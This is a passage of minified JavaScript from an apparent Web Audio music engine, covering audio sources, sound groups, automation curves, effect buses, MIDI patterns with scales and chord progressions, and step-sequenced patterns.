0==t.loop?!1:t.loop,this.lastSource&&(this.lastSource.loop=this._loop),this._loop||(this._loopPlaying=!1),this._loopStart=void 0==t.loop_start?0:t.loop_start,this.lastSource&&(this.lastSource.loopStart=this._loopStart),this._loopEnd=void 0==t.loop_end?0:t.loop_end,this.lastSource&&(this.lastSource.loopEnd=this._loopEnd);var s=void 0==t.offset?0:t.offset;this._offset!=s&&(this._offset=s,i=!0);var o=void 0==t.duration?0:t.duration;if(this._duration!=o&&(this._duration=o,i=!0),this._retrig=void 0==t.retrig?!0:t.retrig,void 0==t.reverse&&(t.reverse=!1),this._reverse!=t.reverse&&(this._reverse=t.reverse,i=!0),void 0==t.xfade&&(t.xfade=!1),this.data.xfade!=t.xfade&&(i=!0),this.data=t,i&&this.init(),t.granular)if(this._granular)void 0!=t.granular.speed&&(this._granular.speed=t.granular.speed),void 0!=t.granular.pitch&&(this._granular.pitch=t.granular.pitch),void 0!=t.granular.pitch_randomization&&(this._granular.pitchRandomization=t.granular.pitch_randomization),void 0!=t.granular.time_randomization&&(this._granular.timeRandomization=t.granular.time_randomization),void 0!=t.granular.grain_duration&&(this._granular.grainDuration=t.granular.grain_duration),void 0!=t.granular.grain_spacing&&(this._granular.grainSpacing=t.granular.grain_spacing);else{this._granular={bufferDuration:this._buffer.duration-.05,speed:t.granular.speed||.3333,pitch:t.granular.pitch||0,pitchRandomization:t.granular.pitch_randomization||0,timeRandomization:t.granular.time_randomization||0,realTime:0,grainTime:0,grainDuration:t.granular.grain_duration||.09,grainSpacing:t.granular.grain_spacing||.045,grainWindow:null};for(var r=16384,a=new Float32Array(r),u=0;r>u;++u)a[u]=Math.sin(Math.PI*u/r);this._granular.grainWindow=a}else this._granular&&(clearTimeout(this._granular.scheduleId),this._granular=null);if(t.panner)if(this._panner)this._panner.setData(t.panner);else{var c=this._destination;this.disconnect(),this._panner=new e.Panner(t.panner),this.connect(c)}else if(!t.panner&&this._panner){var c=this._destination;this.disconnect(),this._panner=null,this.connect(c)}},o}(u);e.AudioSource=c,e.crossfade=i;var h={CONCURRENT:0,STEP:1,RANDOM:2,SHUFFLE:3,BACKWARDS:4},l={NONE:0,ONE:1,INFINITE:2},p=function(e){function i(t,i){e.call(this,t,i),this._adder=0,this._currentId=0,this._paused=!1,this._groupType=void 0!=t.group_type?t.group_type:h.STEP,this._retrig=void 0!=t.retrig?t.retrig:!0,this._queue=void 0!=t.queue?t.queue:l.NONE,this._content=t.content||[],R.instance.pushToPreLoadInitStack(this)}return s(i,e),i.prototype.init=function(){for(var t=[],e=0,i=this._content.length;i>e;e++)t.push(R.instance.findInstance(this._content[e]));this._content=t},i.prototype.connect=function(t){for(var e=0,i=this._content.length;i>e;e++){var n=this._content[e];n.disconnect(),n.connect(this._output)}return this._output.connect(t),this},i.prototype.disconnect=function(){return this._output.disconnect(),this},i.prototype.play=function(e,i,n){if(this._content.length){var s=this.latestPlayed?this.latestPlayed.playing:!1;if(!n&&!this._retrig&&s)return this._queue!=l.NONE&&(this._queue==l.ONE&&this._latestStartTime>t.context.currentTime?(this.latestPlayed.stop(),this.play(this._latestStartTime,i,!0)):this.play(this._latestStartTime+this.latestPlayed.duration,i,!0)),this;if(this._paused=!1,void 0!=i){var o;"number"==typeof i?o=i:"string"==typeof i?o=this.getIdFromString(i):i._name&&(o=this.getIdFromString(i._name)),this._content[o].play(e),this._latestPlayed=this._content[o]}else{if(this._groupType==h.CONCURRENT)for(var r=0,a=this._content.length;a>r;r++)this._content[r].play(e);else this._currentId=this.getIdToPlay(),this._content[this._currentId].play(e);this._groupType===h.CONCURRENT?this._latestPlayed=this._content[0]:this._latestPlayed=this._content[this._currentId]}return this._latestStartTime=e||t.context.currentTime,this}},i.prototype.getIdToPlay=function(){var t;if(this._groupType==h.STEP)t=this._adder<0?this._content.length-1+this._adder%this._content.length:this._adder%this._content.length,this._adder++;else if(this._groupType==h.RANDOM){var e=Math.floor(Math.random()*(this._content.length-1));this._content.length>1&&e==this._adder&&(e=(e+1)%this._content.length),t=this._adder=e}else this._groupType==h.SHUFFLE?(this._adder%this._content.length==0&&U.shuffle(this._content),t=this._adder%this._content.length,this._adder++):this._groupType==h.BACKWARDS&&(t=this._adder<0?this._content.length-1+this._adder%this._content.length:this._adder%this._content.length,this._adder--);return t},i.prototype.stop=function(t){return this._content[this._currentId].stop(t),this},i.prototype.pause=function(){return this._paused=!0,this._latestPlayed&&this._latestPlayed.pause(),this},i.prototype.unpause=function(){return this._paused=!1,this._latestPlayed&&this._latestPlayed.unpause(),this},i.prototype.fadeInAndPlay=function(t,e){var i=this.latestPlayed?this.latestPlayed.playing:!1;if(this._retrig||!i)return this._currentId=this.getIdToPlay(),this._latestPlayed=this._content[this._currentId],this._content[this._currentId].fadeInAndPlay(t,e),this},i.prototype.fadeOutAndStop=function(e,i){return void 0==i&&(i=t.context.currentTime),this._latestPlayed&&this._latestPlayed.fadeOutAndStop(e,i),this},i.prototype.curvePlaybackRate=function(t,e){for(var i=0,n=this._content.length;n>i;i++)this._content[i].curvePlaybackRate(t,e);return this},i.prototype.deschedule=function(){for(var t=0,e=this._content.length;e>t;t++)this._content[t].deschedule();return this},i.prototype.getIdFromString=function(t){for(var e=0,i=this._content.length;i>e;e++)if(this._content[e]._name==t)return e},Object.defineProperty(i.prototype,"playbackRate",{set:function(t){for(var e=0,i=this._content.length;i>e;e++)this._content[e].playbackRate=t;
},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"groupType",{get:function(){return this._groupType},set:function(t){this._groupType=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"content",{get:function(){return this._content},set:function(t){this._content=t,this.init()},enumerable:!0,configurable:!0}),i.prototype.addContent=function(t){this._content.push(t)},i.prototype.removeContent=function(t){for(var e=0;e<this._content.length;e++)this._content[e]._name===t&&this._content.splice(e,1)},Object.defineProperty(i.prototype,"playing",{get:function(){return this._latestPlayed?this._latestPlayed.playing:!1},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"duration",{get:function(){return this._latestPlayed?this._latestPlayed.duration:this._content[0].duration},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"playbackState",{get:function(){return this._content[this._currentId].playbackState},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"latestPlayed",{get:function(){return this._latestPlayed},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){e.prototype.setData.call(this,t),this._groupType=void 0==t.group_type?h.STEP:t.group_type,this._retrig=void 0==t.retrig?!0:t.retrig,this._queue=void 0==t.queue?l.NONE:t.queue,t.content&&(this._content=t.content,this.init())},i}(u);e.AudioGroup=p;var _=function(){function e(t){this._startValue=t.start_value||0,this._points=t.points||[]}return e.prototype.automate=function(e,i){i=i||t.context.currentTime,e.cancelScheduledValues(i),e.setValueAtTime(this._startValue,i);for(var n=0,s=0,o=this._points.length;o>s;s++){var r=this._points[s];switch(r.curve){case"lin":e.linearRampToValueAtTime(r.value,i+r.time);break;case"exp":e.exponentialRampToValueAtTime(r.value,i+r.time);break;default:if(!U.CUSTOM_CURVES[r.curve]){t.warn("Automation: Invalid curve type: "+r.curve);break}e.setValueCurveAtTime(U.CUSTOM_CURVES[r.curve],i+n,r.time-n)}n=r.time}},e}();e.Automation=_;var f=function(){function e(e,i){this._name=i,this._type=e.type,this._input=t.context.createGain(),this._output=t.context.createGain(),this._effects=e.effects||[];for(var n=0,s=this._effects.length;s>n;n++)e.effects[n].active===!1&&this._effects[n].setActive(!1);this._input.gain.value=void 0!==e.input_vol?e.input_vol:1,this._output.gain.value=void 0!==e.output_vol?e.output_vol:1,e.destination_name&&(this.destinationName=e.destination_name,R.instance.pushToConnectStack(this)),R.instance.pushToPreLoadInitStack(this)}return e.prototype.init=function(){for(var t=this._input,e=0,i=this._effects.length;i>e;e++)t.disconnect(),t.connect(this._effects[e].input),t=this._effects[e];t.connect(this._output)},e.prototype.connect=function(t){return this._output.connect(t),this},e.prototype.disconnect=function(){return this._output.disconnect(),this},e.prototype.insertEffect=function(t,e){var i=R.instance.createObject(void 0,t,{excludeFromTable:!0});return void 0==e?this._effects.push(i):this._effects.splice(e,0,i),this.init(),this},e.prototype.moveEffect=function(t,e){for(var i=0,n=this._effects.length;n>i;i++)this._effects[i].disconnect();var s=this._effects[t];return this._effects.splice(t,1),this._effects.splice(e,0,s),this.init(),this},Object.defineProperty(e.prototype,"input",{get:function(){return this._input},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"output",{get:function(){return this._output},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"effects",{get:function(){return this._effects},enumerable:!0,configurable:!0}),e.prototype.setData=function(t){if(this._input.gain.value=void 0==t.input_vol?1:t.input_vol,this._output.gain.value=void 0==t.output_vol?1:t.output_vol,t.effects.length<this.effects.length){this.input.disconnect();for(var e=!1,i=0;i<this._effects.length;i++)this._effects[i].disconnect(),e||(void 0==t.effects[i]?(this._effects.splice(i,1),e=!0):this._effects[i]._type!=t.effects[i].type&&(this._effects.splice(i,1),i--,e=!0));this.init()}else if(t.effects.length>this.effects.length)this.insertEffect(t.effects[t.effects.length-1]);else for(var i=0,n=this._effects.length;n>i;i++)this._effects[i].setData(t.effects[i]);this.destinationName!=t.destination_name&&(this.destinationName=t.destination_name,this.disconnect(),"$OUT"==this.destinationName?this.connect(R.instance._superMasterOutput):this.connect(R.instance.findInstance(this.destinationName).input))},e}();e.Bus=f;var d=function(e){function i(t,i){if(e.call(this,t,i),this._startStep=0,this._totalStep=0,this._currentStep=0,this._syncStep=0,this._stepCount=0,this._fadeTime=0,this._transpose=0,this._scales={diatonic:[0,-1,0,-1,0,0,-1,0,-1,0,-1,0],dorian:[0,1,0,0,-1,0,1,0,1,0,0,-1],phrygian:[0,0,-1,0,-1,0,1,0,0,-1,0,-1],lydian:[0,1,0,1,0,1,0,0,1,0,1,0],mixolydian:[0,1,0,1,0,0,-1,0,-1,0,0,-1],aeolian:[0,-1,0,0,-1,0,-1,0,0,-1,0,-1],locrian:[0,0,-1,0,-1,0,0,-1,0,-1,0,-1],harmonicMinor:[0,1,0,0,-1,0,1,0,0,-1,1,0],melodicMinor:[0,1,0,0,-1,0,1,0,-1,0,1,0],majorPentatonic:[0,1,0,1,0,-1,1,0,1,0,-1,1],minorPentatonic:[0,-1,1,0,-1,0,1,0,-1,1,0,-1],doubleHarmonic:[0,0,-1,1,0,0,1,0,0,-1,1,0],halfDim:[0,1,0,0,-1,0,0,-1,0,-1,0,-1],chromatic:[0,0,0,0,0,0,0,0,0,0,0,0],custom:[0,0,0,0,0,0,0,0,0,0,0,0]},this._state=g.Stopped,this._beatSubscription=t.beat_subscription||.25,this._midiFileId=t.file_id,this._midiTrackIx=t.midi_track||0,this._sequencerName=t.sequencer,this._synthName=t.synth,this._loop=void 0!=t.loop?t.loop:!0,this._length=t.length||0,this._nextClip=0,this._startStep=t.start_step||0,this._root=t.root||0,this._transpose=this._orgTranspose=t.transpose||0,this._scale=this._orgScale=t.scale,this._rootNote=t.root_note||36,this._activeUpbeat=-1,t.upbeats){this._upbeats=[],this._upbeatLoopOffset=0;for(var n=0,s=t.upbeats.length;s>n;n++)this._upbeats.push({length:t.upbeats[n].length,step:t.upbeats[n].step,targetStep:t.upbeats[n].target_step,playInLoop:t.upbeats[n].play_in_loop})}R.instance.pushToPostLoadInitStack(this)}return s(i,e),i.prototype.init=function(){this._sequencer=R.instance.findInstance(this._sequencerName),this._sequencer.registerPattern(this),"progression"===this._synthName?(this._synth="progression",this._progression=!0,this._currentChord=[]):this._synth=R.instance.findInstance(this._synthName),this._midiFile=a.instance.getFile(this._midiFileId),this._midiFile&&this.setupFile()},i.prototype.setupFile=function(){this._midiTrack=this._midiFile.tracks[this._midiTrackIx],void 0==this._midiTrack&&t.warn("MidiPattern: midi track out of bounds: "+this._midiTrackIx),this.recalculateBPM(this._sequencer.bpm);var e=this._midiFile.header.ticksPerBeat,i=0;this._clips=[];for(var n=0,s=this._midiTrack.length;s>n;n++){var o=this._midiTrack[n];i+=o.deltaTime;var r=i/e%this._sequencer.resolution,a=i/e-r;this._clips.push({event:o,step:a,offset:i%(e*this._sequencer.resolution)})}return this},i.prototype.connect=function(t){return this._output.connect(t),this},i.prototype.disconnect=function(){return this._output.disconnect(),this},i.prototype.changeState=function(t){t!=this._state&&(R.callbacks&&R.callbacks.changePatternState&&R.callbacks.changePatternState({pattern:this,lastState:this._state,newState:t,step:this._sequencer.currentStep}),this._state=t)},i.prototype.prePlaySchedule=function(e,i,n){if(!this._midiFile){if(this._midiFile=a.instance.getFile(this._midiFileId),!this._midiFile)return void t.warn("MidiPattern: midifile not found: "+this._name);this.setupFile()}if(n=n||!1,this._state==g.Playing){if(!n)return this;this._syncStep=i,this.stop(e,!0)}if(this._syncStep=i%this._length,this._currentStep=this._startStep,this.findNextClip(this._currentStep),e>0){if(this._stepCount=e,this._currentStep+=this._syncStep,this._syncStep=0,this._totalStep=0,this.changeState(g.PrePlaying),this._upbeats){this._activeUpbeat=-1;for(var s=0,o=this._upbeats.length;o>s;s++){var r=this._upbeats[s];r.length<=e&&(-1==this._activeUpbeat||this._upbeats[this._activeUpbeat].length<r.length)&&(this._activeUpbeat=s)}-1!=this._activeUpbeat&&this._upbeats[this._activeUpbeat].playInLoop&&(this._upbeatLoopOffset=this._upbeats[this._activeUpbeat].length)}this.findNextClip(-1==this._activeUpbeat?this._currentStep:this._upbeats[this._activeUpbeat].step)}else this.changeState(g.Playing);return this},i.prototype.play=function(e){if(!this._midiFile){if(this._midiFile=a.instance.getFile(this._midiFileId),!this._midiFile)return void t.warn("MidiPattern: midifile not found: "+this._name);this.setupFile()}if(this._state==g.Playing)return this;if(e&&0!=e){var i=this._output.gain.value;this._output.gain.setValueAtTime(0,0),this._output.gain.setValueAtTime(i,e)}return this._currentStep=this._sequencer.currentStep%this._length+this._startStep,this.changeState(g.Playing),this.findNextClip(this._currentStep),this._sequencer.started||this._sequencer.start(),this},i.prototype.restart=function(){return this._currentStep=this._startStep,this._nextClip=0,this},i.prototype.stop=function(t,e){return this._synth.deschedule&&this._sequencer._scheduleAheadTime>.5&&this._synth.deschedule(),void 0==t||this._state==g.Stopped?(this.changeState(g.Stopped),this):(void 0==e&&(e=!0),e?(this._stepCount=this._sequencer.getStepsToNext(this._sequencer.beatLength*t),this.changeState(g.PreStopping)):(this.changeState(g.Stopped),"progression"!==this._synth&&this._synth._loopedSamples&&this._synth.stop(t)),this)},i.prototype.pause=function(){return this},i.prototype.unpause=function(){return this},i.prototype.sendMidiEvents=function(e,i,n){for(var s=this._nextClip;this._clips[this._nextClip].step==e;){var o=this._clips[this._nextClip];if(this._progression){if("noteOn"===o.event.subtype)this._currentChord.push(o.event.noteNumber);else if("noteOff"===o.event.subtype){var r=this._currentChord.indexOf(o.event.noteNumber);r>-1&&this._currentChord.splice(r,1)}}else{var a=0;if(o.event.noteNumber){if(this._scale){var u=o.event.noteNumber,c=u%12-this._root;0>c&&(c+=12),a=this._scales[this._scale][c]}0!=this._transpose&&(a+=this._transpose)}n&&"noteOn"===o.event.subtype||this._synth.handleMidiEvent(o.event,i+o.offset*this._secPerTick,a)}if(this._nextClip++,this._nextClip==this._clips.length&&(this._nextClip=0),this._nextClip===s){t.log("MidiPattern",this._name,"got stuck, check if you're playing the correct midi track.");break}}if(this._progression&&this._currentChord.length){this._currentChord.sort(function(t,e){return t-e});var h=this._currentChord[0],l=h%12,a=0;l!=this._root&&(a=h-this._rootNote);for(var p=[0,0,0,0,0,0,0,0,0,0,0,0],_=[],f=0;f<this._currentChord.length;f++){var d=this._currentChord[f]%12-l;0>d&&(d+=12),_.push(d)}_.sort(function(t,e){return t-e});for(var g=0;g<p.length;g++){var y=this.getClosestValues(_,g);void 0!==y&&(p[g]=y-g)}this._sequencer.customScale=p,this._sequencer.transpose=a,this._rootNote=h}},i.prototype.getClosestValues=function(t,e){for(var i=-1,n=t.length;n-i>1;){var s=Math.round((i+n)/2);t[s]<=e?i=s:n=s}var o;return t[i]==e&&(o=n=i),o=Math.abs(e-n)>Math.abs(e-i)?i:Math.abs(e-n)<Math.abs(e-i)?n:i,t[o]},i.prototype.findNextClip=function(t){for(var e=0,i=this._clips.length;i>e;e++)if(this._clips[e].step>=t)return this._nextClip=e,e},i.prototype.playStep=function(t,e){var i=!0;this._currentStep>=this._length+this._startStep&&(this.sendMidiEvents(this._length,e,!0),this._currentStep=this._startStep,this.findNextClip(this._currentStep),this._loop||(this.changeState(g.Stopped),i=!1)),i&&this.sendMidiEvents(this._currentStep,e,!1),this._totalStep+=this._beatSubscription,this._currentStep+=this._beatSubscription},i.prototype.update=function(t,e){if(this._state!=g.Stopped&&t%this._beatSubscription==0)switch(this._upbeats&&-1!=this._activeUpbeat&&this._upbeats[this._activeUpbeat].playInLoop&&this._state==g.Playing&&this._currentStep>=this._length+this._startStep-this._upbeatLoopOffset&&(this._upbeatLoopOffset>0&&(this._stepCount=this._upbeatLoopOffset,this.changeState(g.PrePlaying)),this.sendMidiEvents(this._currentStep,e,!0),this._currentStep=this._startStep,this.findNextClip(this._upbeats[this._activeUpbeat].step)),this._state){case g.PrePlaying:if(-1!=this._activeUpbeat){var i=this._upbeats[this._activeUpbeat],n=i.length-this._stepCount;n>=0&&this.sendMidiEvents(i.step+n,e,!1)}this._stepCount-=this._beatSubscription,this._stepCount<=0&&(-1!=this._activeUpbeat&&i.targetStep&&(this._currentStep=i.targetStep),this.findNextClip(this._currentStep),this.changeState(g.Playing));break;case g.Playing:this.playStep(t,e);break;case g.PreStopping:this._stepCount-=this._beatSubscription,this._stepCount<=0?this.stop(e,!1):this.playStep(t,e);break;case g.PostStop:}return this},i.prototype.recalculateBPM=function(t){var e=this._midiFile.header.ticksPerBeat,i=6e7/t,n=i/1e6;this._secPerTick=n/e},i.prototype.getNextBar=function(t){var e=Math.ceil(this._currentStep/t);return this._currentStep>this._length-t&&(e=0),e},i.prototype.fadeInAndPlay=function(t,e){return this.play(e),this.output.gain.value=0,U.curveParamLin(this.output.gain,1,t,e),this},i.prototype.fadeOutAndStop=function(e,i){return void 0==i&&(i=t.context.currentTime),this.output.gain.cancelScheduledValues(i),U.curveParamLin(this.output.gain,0,e,i),U.setParam(this.output.gain,this._volume,i+e),this.stop(i+e),this},i.prototype.deschedule=function(t){if(void 0==t&&(t=this._length),this._synth.deschedule&&this._synth.deschedule(),this._state!=g.Stopped){if(t%=this._length,this._currentStep=this._currentStep-t,this._currentStep<this._startStep){var e=this._startStep-this._currentStep;this._currentStep=this._startStep+this._length-e}for(var i=0,n=this._clips.length;n>i;i++)if(this._clips[i].step>=this._currentStep){this._nextClip=i;break}}return this},i.prototype.resetTranspose=function(){this._transpose=this._orgTranspose},Object.defineProperty(i.prototype,"length",{get:function(){return this._length},set:function(t){this._length=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"startStep",{set:function(t){this._startStep=t,this._currentStep=this._sequencer.currentStep%this._length+this._startStep;for(var e=0,i=this._clips.length;i>e;e++)if(this._clips[e].step>=this._currentStep){this._nextClip=e;break}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"scale",{set:function(t){this._progression||("reset"===t?this._scale=this._orgScale:this._scale=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"customScale",{set:function(t){this._progression||(this._scales.custom=t,this._scale="custom")},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"transpose",{get:function(){return this._transpose},set:function(t){this._transpose=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"loop",{get:function(){return this._loop},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"state",{get:function(){return this._state},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"playing",{get:function(){var t=!1;return(1===this._state||1===this._state)&&(t=!0),t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"duration",{get:function(){return this._length*this._sequencer.getNoteTime(1)},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){e.prototype.setData.call(this,t);var i=!1;if(this._beatSubscription=void 0==t.beat_subscription?.25:t.beat_subscription,this._midiFile!=t.file_id&&(this._midiFile=t.file_id),this._midiTrackIx!=t.midi_track&&(this._midiTrackIx=t.midi_track),void 0!=t.sequener&&this._sequencerName!=t.sequencer&&(this._sequencerName=t.sequencer,i=!0),void 0!=t.synth&&this._synthName!=t.synth&&(this._synthName=t.synth,i=!0),this._loop=void 0==t.loop?!1:t.loop,this._length=void 0==t.length?0:t.length,this._root=void 0==t.root?0:t.root,this._orgTranspose=void 0==t.transpose?0:t.transpose,this._transpose=this._orgTranspose,this._orgScale=void 0==t.scale?0:t.scale,this._scale=this._orgScale,this._rootNote=void 0==t.root_note?36:t.root_note,this._activeUpbeat=-1,t.upbeats){this._upbeats=[],this._upbeatLoopOffset=0;for(var n=0,s=t.upbeats.length;s>n;n++)this._upbeats.push({length:t.upbeats[n].length,step:t.upbeats[n].step,targetStep:t.upbeats[n].target_step,playInLoop:t.upbeats[n].play_in_loop});i=!0}i&&(this._sequencer.unregisterPattern(this),this.init())},i}(u);e.MidiPattern=d,function(t){t._map=[],t._map[0]="PrePlaying",t.PrePlaying=0,t._map[1]="Playing",t.Playing=1,t._map[2]="PreStopping",t.PreStopping=2,t._map[3]="PostStop",t.PostStop=3,t._map[4]="Stopped",t.Stopped=4}(e.PatternState||(e.PatternState={}));var g=e.PatternState;e.getPatternStateString=n;var y=function(e){function i(t,i){e.call(this,t,i),this._startStep=0,this._totalStep=0,this._currentStep=0,this._syncStep=0,this._stepCount=0,this._fadeTime=0,this._length=2,this._loop=!0,this._tail=!1,this._forceFade=!1,this._activeUpbeat=-1,this._startOffset=0,this._state=g.Stopped,this._beatSubscription=t.beat_subscription||.25,this._length=t.length||0,this._startStep=t.start_step||0,this._loop=void 0!=t.loop?t.loop:!0,this._tail=void 0!=t.tail?t.tail:!1,this._clips=[],this._upbeats=[],this._sequencerName=t.sequencer,this._initData={dummyClips:t.content,dummyUpbeats:t.upbeats},R.instance.pushToPreLoadInitStack(this)}return s(i,e),i.prototype.init=function(){if(this._initData.dummyClips)for(var t=0,e=this._initData.dummyClips.length;e>t;t++){var i=this._initData.dummyClips[t];i.audio?(this._clips.push({audio:R.instance.findInstance(i.audio),process:null,args:null,step:i.step}),this._clips[this._clips.length-1].audio._parentType=this._type):this._clips.push({audio:null,process:R.instance.findInstance(i.process),args:i.args,step:i.step})}if(this._initData.dummyUpbeats){for(var t=0,n=this._initData.dummyUpbeats.length;n>t;t++){for(var s=this._initData.dummyUpbeats[t],o=[],r=0,a=s.content.length;a>r;r++){var u=s.content[r];u.audio?(o.push({audio:R.instance.findInstance(u.audio),process:null,args:null,step:u.step}),this._clips[this._clips.length-1].audio._parentType=this._type):o.push({audio:null,process:R.instance.findInstance(u.process),args:u.args,step:u.step})}s.clips=o,this._upbeats.push({length:s.length,clips:o})}this._upbeats.sort(function(t,e){return e.length-t.length})}this._sequencer=R.instance.findInstance(this._sequencerName),this._sequencer.registerPattern(this),this._initData=null},i.prototype.connect=function(t){for(var e=0,i=this._clips.length;i>e;e++){var n=this._clips[e].audio;!n||n.destinationName&&"$OUT"!=R.instance.findInstance(n.destinationName).destinationName||(n.disconnect(),n.connect(this._output))}return this._output.connect(t),this},i.prototype.disconnect=function(){return this._output.disconnect(),this},i.prototype.changeState=function(t){t!=this._state&&(R.callbacks&&R.callbacks.changePatternState&&R.callbacks.changePatternState({pattern:this,lastState:this._state,newState:t,step:this._sequencer.currentStep}),this._state=t)},i.prototype.prePlaySchedule=function(e,i,n,s,o,r){n=n||!1;var a=t.context.currentTime;if(this._state==g.PreStopping||this._state==g.PostStop)return this._output.gain.cancelScheduledValues(a),this._output.gain.setValueAtTime(this._output.gain.value,a),this._output.gain.linearRampToValueAtTime(this._volume,a+.5),this.changeState(g.Playing),clearTimeout(this._stoppingId),this;if(this._output.gain.value!=this._volume||g.Stopped){var u;u=this._state===g.Stopped&&s?0:this._output.gain.value,this._output.gain.cancelScheduledValues(a),this._output.gain.setValueAtTime(u,a),this._output.gain.linearRampToValueAtTime(this._volume,a+o)}else if(s){var c=this._sequencer.getBeatTime(e);this._output.gain.cancelScheduledValues(c),this._output.gain.setValueAtTime(0,c),this._output.gain.linearRampToValueAtTime(this._volume,c+o)}if(this._state==g.Playing||this._state==g.PrePlaying){if(!n)return this;this._syncStep=i,this.stop(e,!0,0)}if(void 0!=r&&(this._startOffset=r),this._syncStep=i%this._length+this._startStep,e>0||n){this._stepCount=e,this._currentStep=this._startStep,this._totalStep=0,this._activeUpbeat=-1;for(var h=0,l=this._upbeats.length;l>h;h++){var p=this._upbeats[h];p.length<=e&&(-1==this._activeUpbeat||this._upbeats[this._activeUpbeat].length<p.length)&&(this._activeUpbeat=h)}this.changeState(g.PrePlaying)}else this.changeState(g.Playing);return this},i.prototype.play=function(t){return this._state==g.Playing||this._state==g.PrePlaying?this:((this._state==g.PreStopping||this._state==g.PostStop)&&clearTimeout(this._stoppingId),this._currentStep=this._sequencer.currentStep%this._length+this._startStep,this.changeState(g.Playing),this._sequencer.started||this._sequencer.start(),this)},i.prototype.stop=function(e,i,n,s){if(this._state==g.Stopped)return this;if(this._state===g.PrePlaying)return void this.changeState(g.Stopped);if(void 0==e)return this.changeState(g.Stopped),this._currentStep=0,this;if(void 0==i&&(i=!0),i)this._stepCount=this._sequencer.getStepsToNext(this._sequencer.beatLength*e)||0,this._fadeTime=n,this.changeState(g.PreStopping),s>0&&(this._stepCount+=s);else if(n){var o=n/this._sequencer.getNoteTime(1);this._stepCount=Math.ceil(o),this.changeState(g.Stopped);for(var r=(t.context.currentTime,0);r<this._clips.length;r++)this._clips[r].audio&&this._clips[r].audio.fadeOutAndStop(n,e)}else{this.changeState(g.Stopped),this._currentStep=0;for(var r=0;r<this._clips.length;r++)this._clips[r].audio&&this._clips[r].audio.stop(e+this._sequencer.getNoteTime(this._sequencer.resolution))}return this},i.prototype.pause=function(){for(var t=0,e=this._clips.length;e>t;t++)this._clips[t].audio&&this._clips[t].audio.pause();return this},i.prototype.unpause=function(){for(var t=0,e=this._clips.length;e>t;t++)this._clips[t].audio&&this._clips[t].audio.unpause();return this},i.prototype.playStep=function(t,e){this._currentStep>=this._length+this._startStep&&(this._loop?this._currentStep=this._startStep:this._loop||this.changeState(g.Stopped));for(var i=0,n=this._clips.length;n>i;i++)if(this._clips[i].step==this._currentStep){var s=this._clips[i];s.audio?s.audio.play(e,this._startOffset):s.process.start(s.args)}this._totalStep+=this._beatSubscription,this._currentStep+=this._beatSubscription},i.prototype.update=function(t,e){if(this._state!=g.Stopped&&t%this._beatSubscription==0)switch(this._state){case g.PrePlaying:if(-1!=this._activeUpbeat)for(var i=this._upbeats[this._activeUpbeat],n=0,s=i.clips.length;s>n;n++){var o=i.clips[n];o.step==i.length-this._stepCount&&(o.audio?o.audio.play(e):o.process.start(o.args))}this._stepCount-=this._beatSubscription,this._stepCount<=0&&(this._currentStep=this._startStep+this._syncStep%this._length,this._syncStep=0,this.changeState(g.Playing));break;case g.Playing:this.playStep(t,e);break;case g.PreStopping:this._stepCount-=this._beatSubscription,this._stepCount<=0?!this._tail||this._forceFade?this.stop(e,!1,this._fadeTime):(this.changeState(g.Stopped),this._currentStep=0):this.playStep(t,e);break;case g.PostStop:this.playStep(t,e),this._stepCount-=this._beatSubscription,this._stepCount<=0&&(this._forceFade=!1,this.changeState(g.Stopped),this._currentStep=0)}return this},i.prototype.deschedule=function(t){if(void 0==t&&(t=this._length),this._state!=g.Stopped){t%=this._length;for(var e=0,i=this._clips.length;i>e;e++){var n=this._clips[e];n.audio&&n.audio.deschedule()}if(clearTimeout(this._stoppingId),this._output.gain.cancelScheduledValues(U.now()),this._currentStep=this._currentStep-t,this._currentStep<this._startStep){var s=this._startStep-this._currentStep;this._currentStep=this._startStep+this._length-s}}return this},i.prototype.fadeInAndPlay=function(t,e){return this},i.prototype.fadeOutAndStop=function(t,e){return e=e||U.now(),this.stop(e,!1,t),this},i.prototype.curvePlaybackRate=function(t,e){for(var i=0,n=this._clips.length;n>i;i++)this._clips[i].audio.curvePlaybackRate(t,e);return this},i.prototype.getNextBar=function(t){var e=Math.ceil(this._currentStep/t);return this._currentStep>this._length-t&&(e=0),e},Object.defineProperty(i.prototype,"forceFade",{set:function(t){this._forceFade=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"playbackRate",{set:function(t){for(var e=0,i=this._clips.length;i>e;e++)this._clips[e].audio.playbackRate=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"length",{get:function(){return this._length},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"loop",{get:function(){return this._loop},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"state",{get:function(){return this._state},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"playing",{get:function(){var t=!1;return(1===this._state||1===this._state)&&(t=!0),t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"duration",{get:function(){return this._length*this._sequencer.getNoteTime(1)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"playbackState",{get:function(){return 0},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"currentStep",{get:function(){return this._currentStep},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){e.prototype.setData.call(this,t);var i=!1;this._beatSubscription=void 0!=t.beat_subscription?t.beat_subscription:.25,this._length=void 0!=t.length?t.length:0,this._startStep=void 0!=t.start_step?t.start_step:0,this._loop=void 0==t.loop?!0:t.loop,this._tail=void 0==t.tail?!1:t.tail,void 